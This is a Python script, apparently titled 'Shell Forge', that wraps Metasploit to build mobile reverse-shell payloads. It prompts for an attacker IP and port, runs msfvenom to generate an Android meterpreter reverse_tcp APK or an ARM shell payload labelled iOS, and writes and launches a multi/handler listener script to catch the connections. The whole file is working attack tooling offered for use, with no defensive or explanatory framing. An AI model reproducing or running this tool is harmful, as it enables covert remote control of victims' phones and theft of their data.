import os
import subprocess
from colorama import Fore, Style

# Banner
def print_banner():
    print(Fore.CYAN + """

 ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒▒▓███▓▒░▒▓██████▓▒░   
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░      ░▒▓█▓▒░      ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░ 
                                                                                                                                          
                                                                                                                                          

    """ + Style.RESET_ALL)



# Generate Payload
def generate_payload():
    print(Fore.YELLOW + "\n[+] Generating Payload..." + Style.RESET_ALL)
    lhost = input(Fore.CYAN + "Enter LHOST (Your IP): " + Style.RESET_ALL)
    lport = input(Fore.CYAN + "Enter LPORT (Your Port): " + Style.RESET_ALL)
    payload_type = input(Fore.CYAN + "Enter Payload Type (android/ios): " + Style.RESET_ALL).lower()

    if payload_type == "android":
        output_file = "android_payload.apk"
        payload = "android/meterpreter/reverse_tcp"
    elif payload_type == "ios":
        output_file = "ios_payload"
        payload = "osx/armle/shell_reverse_tcp"
    else:
        print(Fore.RED + "[-] Invalid payload type. Exiting..." + Style.RESET_ALL)
        return

    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_file}"
    print(Fore.YELLOW + f"[+] Running: {command}" + Style.RESET_ALL)
    os.system(command)
    print(Fore.GREEN + f"[+] Payload saved as {output_file}" + Style.RESET_ALL)

# Set Up Listener
def setup_listener():
    print(Fore.YELLOW + "\n[+] Setting Up Listener..." + Style.RESET_ALL)
    lhost = input(Fore.CYAN + "Enter LHOST (Your IP): " + Style.RESET_ALL)
    lport = input(Fore.CYAN + "Enter LPORT (Your Port): " + Style.RESET_ALL)
    payload_type = input(Fore.CYAN + "Enter Payload Type (android/ios): " + Style.RESET_ALL).lower()

    if payload_type == "android":
        payload = "android/meterpreter/reverse_tcp"
    elif payload_type == "ios":
        payload = "osx/armle/shell_reverse_tcp"
    else:
        print(Fore.RED + "[-] Invalid payload type. Exiting..." + Style.RESET_ALL)
        return

    print(Fore.YELLOW + f"[+] Starting Metasploit Listener for {payload_type}..." + Style.RESET_ALL)
    listener_commands = f"""
    use exploit/multi/handler
    set payload {payload}
    set LHOST {lhost}
    set LPORT {lport}
    exploit
    """
    with open("listener.rc", "w") as f:
        f.write(listener_commands)
    os.system("msfconsole -r listener.rc")

# Main Menu
def main():
    print_banner()
    while True:
        print(Fore.CYAN + "\n[1] Generate Payload")
        print("[2] Set Up Listener")
        print("[3] Exit" + Style.RESET_ALL)
        choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL)

        if choice == "1":
            generate_payload()
        elif choice == "2":
            setup_listener()
        elif choice == "3":
            print(Fore.RED + "[-] Exiting..." + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "[-] Invalid choice. Try again." + Style.RESET_ALL)

if __name__ == "__main__":
    main()